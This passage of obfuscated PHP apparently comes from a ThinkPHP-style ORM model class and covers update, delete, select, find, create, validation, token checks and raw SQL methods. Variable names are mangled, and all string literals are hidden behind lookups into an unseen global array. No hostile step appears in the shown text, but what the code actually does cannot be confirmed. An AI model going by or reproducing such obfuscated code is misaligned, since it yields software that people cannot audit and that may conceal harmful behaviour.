(empty($‚¼™ğáâÒÜ)) { if (!empty($this->data)) { $‚¼™ğáâÒÜ = $this->data; $this->data = array(); } else { $this->error = think_lang($â[269]); return !1; } } $‚¼™ğáâÒÜ = $this->_facade($‚¼™ğáâÒÜ); $õÎºãÉÍë× = $this->_parseOptions($õÎºãÉÍë×); $È = $this->getPk(); if (!isset($õÎºãÉÍë×[$â[273]])) { if (isset($‚¼™ğáâÒÜ[$È])) { $ˆÑ‰–á[$È] = $‚¼™ğáâÒÜ[$È]; $õÎºãÉÍë×[$â[273]] = $ˆÑ‰–á; unset($‚¼™ğáâÒÜ[$È]); } else { $this->error = think_lang($â[272]); return !1; } } if (is_array($õÎºãÉÍë×[$â[273]]) && isset($õÎºãÉÍë×[$â[273]][$È])) { $§Œä…ô = $õÎºãÉÍë×[$â[273]][$È]; } if (!1 === $this->_beforeUpdate($‚¼™ğáâÒÜ, $õÎºãÉÍë×)) { return !1; } $È®¹ = $this->db->update($‚¼™ğáâÒÜ, $õÎºãÉÍë×); if (!1 !== $È®¹) { if (isset($§Œä…ô)) { $‚¼™ğáâÒÜ[$È] = $§Œä…ô; } $this->_afterUpdate($‚¼™ğáâÒÜ, $õÎºãÉÍë×); } return $È®¹; } protected function _beforeUpdate(&$’¡™Â, $­ŸßŸÃÆÕ£èé) { } protected function _afterUpdate($ÈèÕ¾ÜøÕÁ, $ú‘í) { } public function delete($ôî¯ñİøƒâ˜ö = array()) { $ïÏœâè«¥Â =& $_SERVER[ÀÆ]; if (empty($ôî¯ñİøƒâ˜ö) && empty($this->options[$ïÏœâè«¥Â[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $£‚ü°ÛÂ™ö‚ = $this->getPk(); if (is_numeric($ôî¯ñİøƒâ˜ö) || is_string($ôî¯ñİøƒâ˜ö)) { if (strpos($ôî¯ñİøƒâ˜ö, $ïÏœâè«¥Â[47])) { $¬ƒâ¥‡ççÜ[$£‚ü°ÛÂ™ö‚] = array($ïÏœâè«¥Â[274], $ôî¯ñİøƒâ˜ö); } else { $¬ƒâ¥‡ççÜ[$£‚ü°ÛÂ™ö‚] = $ôî¯ñİøƒâ˜ö; } $this->options[$ïÏœâè«¥Â[273]] = $¬ƒâ¥‡ççÜ; } $ôî¯ñİøƒâ˜ö = $this->_parseOptions(); if (is_array($ôî¯ñİøƒâ˜ö[$ïÏœâè«¥Â[273]]) && isset($ôî¯ñİøƒâ˜ö[$ïÏœâè«¥Â[273]][$£‚ü°ÛÂ™ö‚])) { $ü½á˜›õ = $ôî¯ñİøƒâ˜ö[$ïÏœâè«¥Â[273]][$£‚ü°ÛÂ™ö‚]; } $ÜÃ = $this->db->delete($ôî¯ñİøƒâ˜ö); if (!1 !== $ÜÃ) { $°ñï = array(); if (isset($ü½á˜›õ)) { $°ñï[$£‚ü°ÛÂ™ö‚] = $ü½á˜›õ; } $this->_after_delete($°ñï, $ôî¯ñİøƒâ˜ö); } return $ÜÃ; } protected function _after_delete($ï³ìÒ, $ƒÂ‘£Â†‹) { } public function select($ì°œ±‘í›í¯ = array()) { $—÷ëü²ËÁ‚ =& $_SERVER[ÀÆ]; if (is_string($ì°œ±‘í›í¯) || is_numeric($ì°œ±‘í›í¯)) { $­òà”¤¤ù = $this->getPk(); if (strpos($ì°œ±‘í›í¯, $—÷ëü²ËÁ‚[47])) { $§™ïš­¶¿ÈéĞ[$­òà”¤¤ù] = array($—÷ëü²ËÁ‚[274], $ì°œ±‘í›í¯); } else { $§™ïš­¶¿ÈéĞ[$­òà”¤¤ù] = $ì°œ±‘í›í¯; } $this->options[$—÷ëü²ËÁ‚[273]] = $§™ïš­¶¿ÈéĞ; } elseif (!1 === $ì°œ±‘í›í¯) { $ì°œ±‘í›í¯ = $this->_parseOptions(); return $—÷ëü²ËÁ‚[275] . $this->db->buildSelectSql($ì°œ±‘í›í¯) . $—÷ëü²ËÁ‚[276]; } $ì°œ±‘í›í¯ = $this->_parseOptions(); $˜‹Úª¨Ò = $this->db->select($ì°œ±‘í›í¯); if (!1 === $˜‹Úª¨Ò) { return !1; } if (empty($˜‹Úª¨Ò)) { return null; } $this->_afterSelect($˜‹Úª¨Ò, $ì°œ±‘í›í¯); return $˜‹Úª¨Ò; } protected function _afterSelect(&$ˆûÚ¶¡Ïœ” , $Û÷ÛÇé) { } public function buildSql($–  = array()) { $üáŞé =& $_SERVER[ÀÆ]; $–  = $this->_parseOptions($– ); return $üáŞé[275] . $this->db->buildSelectSql($– ) . $üáŞé[276]; } public function optionsValue($î±•¿µßì‚‚ = null) { if (is_null($î±•¿µßì‚‚)) { return $this->options; } elseif (is_array($î±•¿µßì‚‚)) { $this->options = array_merge($this->options, $î±•¿µßì‚‚); } } protected function _parseOptions($¹ = array()) { $†ÁÍ™ =& $_SERVER[ÀÆ]; if (is_array($¹)) { $¹ = array_merge($this->options, $¹); } $this->options = array(); if (!isset($¹[$†ÁÍ™[277]])) { $¹[$†ÁÍ™[277]] = $this->getTableName(); $Ì’È¡„ë€ú—ã = $this->fields; } else { $Ì’È¡„ë€ú—ã = $this->getDbFields(); } if (!empty($¹[$†ÁÍ™[278]])) { $¹[$†ÁÍ™[277]] .= $†ÁÍ™[50] . $¹[$†ÁÍ™[278]]; } $¹[$†ÁÍ™[279]] = $this->name; if (isset($¹[$†ÁÍ™[273]]) && is_array($¹[$†ÁÍ™[273]]) && !empty($Ì’È¡„ë€ú—ã) && !isset($¹[$†ÁÍ™[280]]) && !isset($¹[$†ÁÍ™[277]])) { foreach ($¹[$†ÁÍ™[273]] as $æ => $ÈÓñ×) { $æ = trim($æ); if (in_array($æ, $Ì’È¡„ë€ú—ã, !0)) { if (is_scalar($ÈÓñ×)) { $this->_parseType($¹[$†ÁÍ™[273]], $æ); } } elseif (!is_numeric($æ) && $†ÁÍ™[71] != substr($æ, 0, 1) && !1 === strpos($æ, $†ÁÍ™[95]) && !1 === strpos($æ, $†ÁÍ™[258]) && !1 === strpos($æ, $†ÁÍ™[281]) && !1 === strpos($æ, $†ÁÍ™[282])) { unset($¹[$†ÁÍ™[273]][$æ]); } } } $this->_options_filter($¹); return $¹; } protected function _options_filter(&$Ç) { } protected function _parseType(&$’’ï­Ï°‹Š¤, $å¥) { $öŞó =& $_SERVER[ÀÆ]; if (empty($this->options[$öŞó[283]][$öŞó[4] . $å¥])) { $ìÈ¼ÅôÂøÚ = strtolower($this->fields[$öŞó[250]][$å¥]); if (!1 !== strpos($ìÈ¼ÅôÂøÚ, $öŞó[284])) { } elseif (!1 === strpos($ìÈ¼ÅôÂøÚ, $öŞó[285]) && !1 !== strpos($ìÈ¼ÅôÂøÚ, $öŞó[286])) { $’’ï­Ï°‹Š¤[$å¥] = intval($’’ï­Ï°‹Š¤[$å¥]); } elseif (!1 !== strpos($ìÈ¼ÅôÂøÚ, $öŞó[287]) || !1 !== strpos($ìÈ¼ÅôÂøÚ, $öŞó[288])) { $’’ï­Ï°‹Š¤[$å¥] = floatval($’’ï­Ï°‹Š¤[$å¥]); } elseif (!1 !== strpos($ìÈ¼ÅôÂøÚ, $öŞó[289])) { $’’ï­Ï°‹Š¤[$å¥] = (bool) $’’ï­Ï°‹Š¤[$å¥]; } } } public function find($œ = array()) { $¤“ôÃÂÚ˜ì÷ =& $_SERVER[ÀÆ]; if (is_numeric($œ) || is_string($œ)) { $èå‰÷üªƒ¶¥[$this->getPk()] = intval($œ); $this->options[$¤“ôÃÂÚ˜ì÷[273]] = $èå‰÷üªƒ¶¥; } $this->options[$¤“ôÃÂÚ˜ì÷[290]] = 1; $œ = $this->_parseOptions(); $™ôÊİ = $this->db->select($œ); if (!1 === $™ôÊİ) { return !1; } if (empty($™ôÊİ)) { return null; } $this->data = $™ôÊİ[0]; $this->_afterFind($this->data, $œ); if (!empty($this->options[$¤“ôÃÂÚ˜ì÷[291]])) { return $this->returnResult($this->data, $this->options[$¤“ôÃÂÚ˜ì÷[291]]); } return $this->data; } protected function _afterFind(&$¯ÊŸéò……ÃÕÒ, $â»é¬—) { } protected function returnResult($µ¤—í†, $¶¹âå¤›¿ = '') { $Ì®õéÏÊ“‡³¨ =& $_SERVER[ÀÆ]; if ($¶¹âå¤›¿) { if (is_callable($¶¹âå¤›¿)) { return call_user_func($¶¹âå¤›¿, $µ¤—í†); } switch (strtolower($¶¹âå¤›¿)) { case $Ì®õéÏÊ“‡³¨[292]: return json_encode($µ¤—í†); case $Ì®õéÏÊ“‡³¨[293]: return xml_encode($µ¤—í†); } } return $µ¤—í†; } public function parseFieldsMap($Ï¤û, $ãÔè = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¨£è¥¹ÄÁã” => $°é×Àö¨) { if ($ãÔè == 1) { if (isset($Ï¤û[$°é×Àö¨])) { $Ï¤û[$¨£è¥¹ÄÁã”] = $Ï¤û[$°é×Àö¨]; unset($Ï¤û[$°é×Àö¨]); } } else { if (isset($Ï¤û[$¨£è¥¹ÄÁã”])) { $Ï¤û[$°é×Àö¨] = $Ï¤û[$¨£è¥¹ÄÁã”]; unset($Ï¤û[$¨£è¥¹ÄÁã”]); } } } } return $Ï¤û; } public function setField($üîÉ†, $¾ñ = '') { if (is_array($üîÉ†)) { $¦ÎşáÁãöÁ = $üîÉ†; } else { $¦ÎşáÁãöÁ[$üîÉ†] = $¾ñ; } return $this->save($¦ÎşáÁãöÁ); } public function setAdd($æíÈãº®¼«, $ËÍƒâñú = 1) { $«æÂØÆø¡¢ =& $_SERVER[ÀÆ]; $©ôê…®‹à® = $æíÈãº®¼« . $«æÂØÆø¡¢[294] . $ËÍƒâñú; if ($ËÍƒâñú < 0) { $©ôê…®‹à® = $æíÈãº®¼« . $ËÍƒâñú; } return $this->setField($æíÈãº®¼«, array($«æÂØÆø¡¢[295], $©ôê…®‹à®)); } public function getField($—’•ıÂµ†¥¡Ö, $ÊÔº¨ = null) { $…Œ =& $_SERVER[ÀÆ]; $ÛÓÄÔ¢Ÿß„[$…Œ[271]] = $—’•ıÂµ†¥¡Ö; $ÛÓÄÔ¢Ÿß„ = $this->_parseOptions($ÛÓÄÔ¢Ÿß„); $—’•ıÂµ†¥¡Ö = trim($—’•ıÂµ†¥¡Ö); if (strpos($—’•ıÂµ†¥¡Ö, $…Œ[47])) { if (!isset($ÛÓÄÔ¢Ÿß„[$…Œ[290]])) { $ÛÓÄÔ¢Ÿß„[$…Œ[290]] = is_numeric($ÊÔº¨) ? $ÊÔº¨ : $…Œ[33]; } $Ğ = $this->db->select($ÛÓÄÔ¢Ÿß„); if (!empty($Ğ)) { $Ô¥ = explode($…Œ[47], $—’•ıÂµ†¥¡Ö); $—’•ıÂµ†¥¡Ö = array_keys($Ğ[0]); $×ÕáÒ¯ü‰“¸ğ = array_shift($—’•ıÂµ†¥¡Ö); $† = array_shift($—’•ıÂµ†¥¡Ö); $‚ã¨Ãµ¦Ø» = array(); $Ä¿Ø = count($Ô¥); foreach ($Ğ as $ô¹áÔÀ–) { $è²ÁŠÅìÙµœÆ = $ô¹áÔÀ–[$×ÕáÒ¯ü‰“¸ğ]; if (2 == $Ä¿Ø) { $‚ã¨Ãµ¦Ø»[$è²ÁŠÅìÙµœÆ] = $ô¹áÔÀ–[$†]; } else { $‚ã¨Ãµ¦Ø»[$è²ÁŠÅìÙµœÆ] = is_string($ÊÔº¨) ? implode($ÊÔº¨, $ô¹áÔÀ–) : $ô¹áÔÀ–; } } return $‚ã¨Ãµ¦Ø»; } } else { if (!0 !== $ÊÔº¨) { $ÛÓÄÔ¢Ÿß„[$…Œ[290]] = is_numeric($ÊÔº¨) ? $ÊÔº¨ : 1; } if ($ÊÔº¨ === $…Œ[253]) { unset($ÛÓÄÔ¢Ÿß„[$…Œ[290]]); } $ô¹áÔÀ– = $this->db->select($ÛÓÄÔ¢Ÿß„); if (!empty($ô¹áÔÀ–)) { if ($ÊÔº¨ === $…Œ[253]) { return reset($ô¹áÔÀ–[0]); } if (!0 !== $ÊÔº¨ && 1 == $ÛÓÄÔ¢Ÿß„[$…Œ[290]]) { return reset($ô¹áÔÀ–[0]); } foreach ($ô¹áÔÀ– as $«È†½ç¥) { $Û[] = $«È†½ç¥[$—’•ıÂµ†¥¡Ö]; } return $Û; } } return null; } public function create($ŒÀÉˆï¶¨ = '', $­¾íãë©Í¶Ë = '') { $ ¥œŒê =& $_SERVER[ÀÆ]; if (empty($ŒÀÉˆï¶¨)) { $ŒÀÉˆï¶¨ = $_POST; } elseif (is_object($ŒÀÉˆï¶¨)) { $ŒÀÉˆï¶¨ = get_object_vars($ŒÀÉˆï¶¨); } if (empty($ŒÀÉˆï¶¨) || !is_array($ŒÀÉˆï¶¨)) { $this->error = think_lang($ ¥œŒê[269]); return !1; } $ŒÀÉˆï¶¨ = $this->parseFieldsMap($ŒÀÉˆï¶¨, 0); $­¾íãë©Í¶Ë = $­¾íãë©Í¶Ë ? $­¾íãë©Í¶Ë : (!empty($ŒÀÉˆï¶¨[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ ¥œŒê[271]])) { $¾â¼‡®¾ = $this->options[$ ¥œŒê[271]]; unset($this->options[$ ¥œŒê[271]]); } elseif ($­¾íãë©Í¶Ë == THINK_MODEL_INSERT && isset($this->insertFields)) { $¾â¼‡®¾ = $this->insertFields; } elseif ($­¾íãë©Í¶Ë == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¾â¼‡®¾ = $this->updateFields; } if (isset($¾â¼‡®¾)) { if (is_string($¾â¼‡®¾)) { $¾â¼‡®¾ = explode($ ¥œŒê[47], $¾â¼‡®¾); } if (think_config($ ¥œŒê[296])) { $¾â¼‡®¾[] = think_config($ ¥œŒê[297]); } foreach ($ŒÀÉˆï¶¨ as $ê¨Ÿíè¥ø => $Óã¼­•) { if (!in_array($ê¨Ÿíè¥ø, $¾â¼‡®¾)) { unset($ŒÀÉˆï¶¨[$ê¨Ÿíè¥ø]); } } } if (!$this->autoValidation($ŒÀÉˆï¶¨, $­¾íãë©Í¶Ë)) { return !1; } if (!$this->autoCheckToken($ŒÀÉˆï¶¨)) { $this->error = think_lang($ ¥œŒê[298]); return !1; } if ($this->autoCheckFields) { $¾â¼‡®¾ = $this->getDbFields(); foreach ($ŒÀÉˆï¶¨ as $ê¨Ÿíè¥ø => $Óã¼­•) { if (!in_array($ê¨Ÿíè¥ø, $¾â¼‡®¾)) { unset($ŒÀÉˆï¶¨[$ê¨Ÿíè¥ø]); } elseif (MAGIC_QUOTES_GPC && is_string($Óã¼­•)) { $ŒÀÉˆï¶¨[$ê¨Ÿíè¥ø] = stripslashes($Óã¼­•); } } } $this->autoOperation($ŒÀÉˆï¶¨, $­¾íãë©Í¶Ë); $this->data = $ŒÀÉˆï¶¨; return $ŒÀÉˆï¶¨; } public function autoCheckToken($ï¬»ö¶•Áë–Ù) { $¤Ğğµ« =& $_SERVER[ÀÆ]; if (isset($this->options[$¤Ğğµ«[299]]) && !$this->options[$¤Ğğµ«[299]]) { return !0; } if (think_config($¤Ğğµ«[296])) { $òÇÁÓ = think_config($¤Ğğµ«[297]); if (!isset($ï¬»ö¶•Áë–Ù[$òÇÁÓ]) || Session::get($òÇÁÓ)) { return !1; } list($¹¥àÎéË‡Â, $íÚ¢™Êß…) = explode($¤Ğğµ«[71], $ï¬»ö¶•Áë–Ù[$òÇÁÓ]); if ($íÚ¢™Êß… && Session::get($òÇÁÓ . $¤Ğğµ«[95] . $¹¥àÎéË‡Â) === $íÚ¢™Êß…) { Session::remove($òÇÁÓ . $¤Ğğµ«[95] . $¹¥àÎéË‡Â); return !0; } if (think_config($¤Ğğµ«[300])) { Session::remove($òÇÁÓ . $¤Ğğµ«[95] . $¹¥àÎéË‡Â); } return !1; } return !0; } public function regex($äœ˜Øù, $µæß‘¿èæ…­ø) { $ÚÔ ×Æ†¤Œ© =& $_SERVER[ÀÆ]; $”Œè = array($ÚÔ ×Æ†¤Œ©[301] => $ÚÔ ×Æ†¤Œ©[302], $ÚÔ ×Æ†¤Œ©[303] => $ÚÔ ×Æ†¤Œ©[304], $ÚÔ ×Æ†¤Œ©[305] => $ÚÔ ×Æ†¤Œ©[306], $ÚÔ ×Æ†¤Œ©[307] => $ÚÔ ×Æ†¤Œ©[308], $ÚÔ ×Æ†¤Œ©[309] => $ÚÔ ×Æ†¤Œ©[310], $ÚÔ ×Æ†¤Œ©[311] => $ÚÔ ×Æ†¤Œ©[312], $ÚÔ ×Æ†¤Œ©[313] => $ÚÔ ×Æ†¤Œ©[314], $ÚÔ ×Æ†¤Œ©[288] => $ÚÔ ×Æ†¤Œ©[315], $ÚÔ ×Æ†¤Œ©[316] => $ÚÔ ×Æ†¤Œ©[317]); if (isset($”Œè[strtolower($µæß‘¿èæ…­ø)])) { $µæß‘¿èæ…­ø = $”Œè[strtolower($µæß‘¿èæ…­ø)]; } return preg_match($µæß‘¿èæ…­ø, $äœ˜Øù) === 1; } private function autoOperation(&$Üä¨Í†ìŞ¹˜«, $Ì’øŸ©Ø) { $†Éİ =& $_SERVER[ÀÆ]; if (!empty($this->options[$†Éİ[318]])) { $±£Ï±°‡†Ÿ = $this->options[$†Éİ[318]]; unset($this->options[$†Éİ[318]]); } elseif (!empty($this->_auto)) { $±£Ï±°‡†Ÿ = $this->_auto; } if (isset($±£Ï±°‡†Ÿ)) { foreach ($±£Ï±°‡†Ÿ as $›®Ëå) { if (empty($›®Ëå[2])) { $›®Ëå[2] = THINK_MODEL_INSERT; } if ($Ì’øŸ©Ø == $›®Ëå[2] || $›®Ëå[2] == THINK_MODEL_BOTH) { switch (trim($›®Ëå[3])) { case $†Éİ[319]: case $†Éİ[320]: $ÀÅÒóÔèÏ = isset($›®Ëå[4]) ? (array) $›®Ëå[4] : array(); if (isset($Üä¨Í†ìŞ¹˜«[$›®Ëå[0]])) { array_unshift($ÀÅÒóÔèÏ, $Üä¨Í†ìŞ¹˜«[$›®Ëå[0]]); } if ($†Éİ[319] == $›®Ëå[3]) { $Üä¨Í†ìŞ¹˜«[$›®Ëå[0]] = call_user_func_array($›®Ëå[1], $ÀÅÒóÔèÏ); } else { $Üä¨Í†ìŞ¹˜«[$›®Ëå[0]] = call_user_func_array(array(&$this, $›®Ëå[1]), $ÀÅÒóÔèÏ); } break; case $†Éİ[271]: $Üä¨Í†ìŞ¹˜«[$›®Ëå[0]] = $Üä¨Í†ìŞ¹˜«[$›®Ëå[1]]; break; case $†Éİ[321]: if ($†Éİ[33] === $Üä¨Í†ìŞ¹˜«[$›®Ëå[0]]) { unset($Üä¨Í†ìŞ¹˜«[$›®Ëå[0]]); } break; case $†Éİ[322]: default: $Üä¨Í†ìŞ¹˜«[$›®Ëå[0]] = $›®Ëå[1]; } if (!1 === $Üä¨Í†ìŞ¹˜«[$›®Ëå[0]]) { unset($Üä¨Í†ìŞ¹˜«[$›®Ëå[0]]); } } } } return $Üä¨Í†ìŞ¹˜«; } protected function autoValidation($ìÔ±Ë´ä, $˜æâ„ü¬ÇşƒÑ) { $¢†– =& $_SERVER[ÀÆ]; if (!empty($this->options[$¢†–[323]])) { $İ ĞøÁÁã = $this->options[$¢†–[323]]; unset($this->options[$¢†–[323]]); } elseif (!empty($this->_validate)) { $İ ĞøÁÁã = $this->_validate; } if (isset($İ ĞøÁÁã)) { if ($this->patchValidate) { $this->error = array(); } foreach ($İ ĞøÁÁã as $µ‘ºÀÌ´®Ÿ => $Á) { if (empty($Á[5]) || $Á[5] == THINK_MODEL_BOTH || $Á[5] == $˜æâ„ü¬ÇşƒÑ) { if (0 == strpos($Á[2], $¢†–[324]) && strpos($Á[2], $¢†–[325])) { $Á[2] = think_lang(substr($Á[2], 2, -1)); } $Á[3] = isset($Á[3]) ? $Á[3] : THINK_EXISTS_VALIDATE; $Á[4] = isset($Á[4]) ? $Á[4] : $¢†–[326]; switch ($Á[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ìÔ±Ë´ä, $Á)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¢†–[33] != trim($ìÔ±Ë´ä[$Á[0]])) { if (!1 === $this->_validationField($ìÔ±Ë´ä, $Á)) { return !1; } } break; default: if (isset($ìÔ±Ë´ä[$Á[0]])) { if (!1 === $this->_validationField($ìÔ±Ë´ä, $Á)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($”¶êÙù¦, $‹áñ©š¡‹Âó) { if (!1 === $this->_validationFieldItem($”¶êÙù¦, $‹áñ©š¡‹Âó)) { if ($this->patchValidate) { $this->error[$‹áñ©š¡‹Âó[0]] = $‹áñ©š¡‹Âó[2]; } else { $this->error = $‹áñ©š¡‹Âó[2]; return !1; } } return; } protected function _validationFieldItem($Ú½¼’, $Şá) { $†Æ¢—Û =& $_SERVER[ÀÆ]; switch (strtolower(trim($Şá[4]))) { case $†Æ¢—Û[319]: case $†Æ¢—Û[320]: $í = isset($Şá[6]) ? (array) $Şá[6] : array(); if (is_string($Şá[0]) && strpos($Şá[0], $†Æ¢—Û[47])) { $Şá[0] = explode($†Æ¢—Û[47], $Şá[0]); } if (is_array($Şá[0])) { foreach ($Şá[0] as $Ššô’¬¦‰Ö) { $ŞÈóßáßº[$Ššô’¬¦‰Ö] = $Ú½¼’[$Ššô’¬¦‰Ö]; } array_unshift($í, $ŞÈóßáßº); } else { array_unshift($í, $Ú½¼’[$Şá[0]]); } if ($†Æ¢—Û[319] == $Şá[4]) { return call_user_func_array($Şá[1], $í); } else { return call_user_func_array(array(&$this, $Şá[1]), $í); } case $†Æ¢—Û[327]: return $Ú½¼’[$Şá[0]] == $Ú½¼’[$Şá[1]]; case $†Æ¢—Û[328]: if (is_string($Şá[0]) && strpos($Şá[0], $†Æ¢—Û[47])) { $Şá[0] = explode($†Æ¢—Û[47], $Şá[0]); } $ª÷¾±‘™ˆÌ… = array(); if (is_array($Şá[0])) { foreach ($Şá[0] as $Ššô’¬¦‰Ö) { $ª÷¾±‘™ˆÌ…[$Ššô’¬¦‰Ö] = $Ú½¼’[$Ššô’¬¦‰Ö]; } } else { $ª÷¾±‘™ˆÌ…[$Şá[0]] = $Ú½¼’[$Şá[0]]; } if (!empty($Ú½¼’[$this->getPk()])) { $ª÷¾±‘™ˆÌ…[$this->getPk()] = array($†Æ¢—Û[329], $Ú½¼’[$this->getPk()]); } if ($this->where($ª÷¾±‘™ˆÌ…)->find()) { return !1; } return !0; default: return $this->check($Ú½¼’[$Şá[0]], $Şá[1], $Şá[4]); } } public function check($¯Û×é», $©ÜÂ, $È¨¥˜”›ô = "\162\x65\x67\145\x78") { $¨Ì³»‰×Å£µ =& $_SERVER[ÀÆ]; $È¨¥˜”›ô = strtolower(trim($È¨¥˜”›ô)); switch ($È¨¥˜”›ô) { case $¨Ì³»‰×Å£µ[7]: case $¨Ì³»‰×Å£µ[330]: $ÍÊªãÇªö = is_array($©ÜÂ) ? $©ÜÂ : explode($¨Ì³»‰×Å£µ[47], $©ÜÂ); return $È¨¥˜”›ô == $¨Ì³»‰×Å£µ[7] ? in_array($¯Û×é», $ÍÊªãÇªö) : !in_array($¯Û×é», $ÍÊªãÇªö); case $¨Ì³»‰×Å£µ[331]: case $¨Ì³»‰×Å£µ[332]: if (is_array($©ÜÂ)) { $–™ğ = $©ÜÂ[0]; $Ÿúª = $©ÜÂ[1]; } else { list($–™ğ, $Ÿúª) = explode($¨Ì³»‰×Å£µ[47], $©ÜÂ); } return $È¨¥˜”›ô == $¨Ì³»‰×Å£µ[331] ? $¯Û×é» >= $–™ğ && $¯Û×é» <= $Ÿúª : $¯Û×é» < $–™ğ || $¯Û×é» > $Ÿúª; case $¨Ì³»‰×Å£µ[333]: case $¨Ì³»‰×Å£µ[334]: return $È¨¥˜”›ô == $¨Ì³»‰×Å£µ[333] ? $¯Û×é» == $©ÜÂ : $¯Û×é» != $©ÜÂ; case $¨Ì³»‰×Å£µ[335]: $àĞà = mb_strlen($¯Û×é», $¨Ì³»‰×Å£µ[336]); if (strpos($©ÜÂ, $¨Ì³»‰×Å£µ[47])) { list($–™ğ, $Ÿúª) = explode($¨Ì³»‰×Å£µ[47], $©ÜÂ); return $àĞà >= $–™ğ && $àĞà <= $Ÿúª; } else { return $àĞà == $©ÜÂ; } case $¨Ì³»‰×Å£µ[337]: list($²÷©, $è¹ğÎÊö„À) = explode($¨Ì³»‰×Å£µ[47], $©ÜÂ); if (!is_numeric($²÷©)) { $²÷© = strtotime($²÷©); } if (!is_numeric($è¹ğÎÊö„À)) { $è¹ğÎÊö„À = strtotime($è¹ğÎÊö„À); } return NOW_TIME >= $²÷© && NOW_TIME <= $è¹ğÎÊö„À; case $¨Ì³»‰×Å£µ[338]: return in_array(get_client_ip(), explode($¨Ì³»‰×Å£µ[47], $©ÜÂ)); case $¨Ì³»‰×Å£µ[339]: return !in_array(get_client_ip(), explode($¨Ì³»‰×Å£µ[47], $©ÜÂ)); case $¨Ì³»‰×Å£µ[326]: default: return $this->regex($¯Û×é», $©ÜÂ); } } public function query($Ëº’†, $Æ = false) { $òº =& $_SERVER[ÀÆ]; if (!is_bool($Æ) && !is_array($Æ)) { $Æ = func_get_args(); array_shift($Æ); } $Ëº’† = str_replace(array($òº[229], $òº[340]), $òº[50], $Ëº’†); $Ëº’† = $this->parseSql($Ëº’†, $Æ); return $this->db->query($Ëº’†); } public function execute($å‹úˆ‡¾, $’¯ÇÏ¿È = false) { if (!is_bool($’¯ÇÏ¿È) && !is_array($’¯ÇÏ¿È)) { $’¯ÇÏ¿È = func_get_args(); array_shift($’¯ÇÏ¿È); } $å‹úˆ‡¾ = $this->parseSql($å‹úˆ‡¾, $’¯ÇÏ¿È); return $this->db->execute($å‹úˆ‡¾); } protected function parseSql($í¥¶ŞŸˆ, $¬­™÷Šá) { $¾±¶Ë’ =& $_SERVER[ÀÆ]; if (!0 === $¬­™÷Šá) { $Üà˜º = $this->_parseOptions(); $í¥¶ŞŸˆ = $this->db->parseSql($í¥¶ŞŸˆ, $Üà˜º); } elseif (is_array($¬­™÷Šá)) { $¬­™÷Šá = array_map(array($this->db, $¾±¶Ë’[341]), $¬­™÷Šá); $í¥¶ŞŸˆ = vsprintf($í¥¶ŞŸˆ, $¬­™÷Šá); } else { $í¥¶ŞŸˆ = strtr($í¥¶ŞŸˆ, array($¾±¶Ë’[342] => $this->getTableName(), $¾±¶Ë’[343] => think_config($¾±¶Ë’[242]))); } $this->db->setModel($this->name); return $í¥¶ŞŸˆ; } public function db($óÛÖü = '', $È§–ñ = '', $äËÕòí±ıù = array()) { $¸ù =& $_SERVER[ÀÆ]; if ($¸ù[33] === $óÛÖü && $this->db) { return $this->db; } static $Î¼‡—ƒËë = array(); static $½ä• ÓÓß¼ = array(); if (!isset($½ä• ÓÓß¼[$óÛÖü]) || isset($½ä• ÓÓß¼[$óÛÖü]) && $È§–ñ && $Î¼‡—ƒËë[$óÛÖü] != $È§–ñ) { if (!empty($È§–ñ) && is_string($È§–ñ) && !1 === strpos($È§–ñ, $¸ù[8])) { $È§–ñ = think_config($È§–ñ); } $óÛÖü = think_guid($È§–ñ); $½ä• ÓÓß¼[$óÛÖü] = Db::getInstance($È§–ñ); } elseif (NULL === $È§–ñ) { $½ä• ÓÓß¼[$óÛÖü]->close(); unset($½ä• ÓÓß¼[$óÛÖü]); return; } if (!empty($äËÕòí±ıù)) { if (is_string($äËÕòí±ıù)) { parse_str($äËÕòí±ıù, $äËÕòí±ıù); } foreach ($äËÕòí±ıù as $ÃË => $©š„í„²ı) { $this->setProperty($ÃË, $©š„í„²ı); } } $Î¼‡—ƒËë[$óÛÖü] = $È§–ñ; $this->db = $½ä• ÓÓß¼[$óÛÖü]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ãš¦¿Œ“† = get_class($this); if ($Ãš¦¿Œ“† == $_SERVER[ÀÆ][344]) { return $this->name; } $this->name = substr($Ãš¦¿Œ“†, 0, -5); } return $this->name; } public function getTableName() { $­³ =& $_SERVER[ÀÆ]; if (empty($this->trueTableName)) { $÷¿±• = !empty($this->tablePrefix) ? $this->tablePrefix : $­³[33]; if (!empty($this->tableName)) { $÷¿±• .= $this->tableName; } else { $÷¿±• .= think_parse_name($this->name); } $this->trueTableName = strtolower($÷¿±•); } return (!empty($this->dbName) ? $this->dbName . $­³[95] : $­³[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¦äº•å¿ÍüË÷ =& $_SERVER[ÀÆ]; return isset($this->fields[$¦äº•å¿ÍüË÷[249]]) ? $this->fields[$¦äº•å¿ÍüË÷[249]] : $this->pk; } public function getDbFields() { $ÄŸÛìšŠñÎÇ =& $_SERVER[ÀÆ]; if (isset($this->options[$ÄŸÛìšŠñÎÇ[277]])) { $ù±Ô¬ƒÉ» = $this->db->getFields($this->options[$ÄŸÛìšŠñÎÇ[277]]); return $ù±Ô¬ƒÉ» ? array_keys($ù±Ô¬ƒÉ») : !1; } if ($this->fields) { $ù±Ô¬ƒÉ» = $this->fields; unset($ù±Ô¬ƒÉ»[$ÄŸÛìšŠñÎÇ[248]], $ù±Ô¬ƒÉ»[$ÄŸÛìšŠñÎÇ[249]], $ù±Ô¬ƒÉ»[$ÄŸÛìšŠñÎÇ[250]], $ù±Ô¬ƒÉ»[$ÄŸÛìšŠñÎÇ[247]]); return 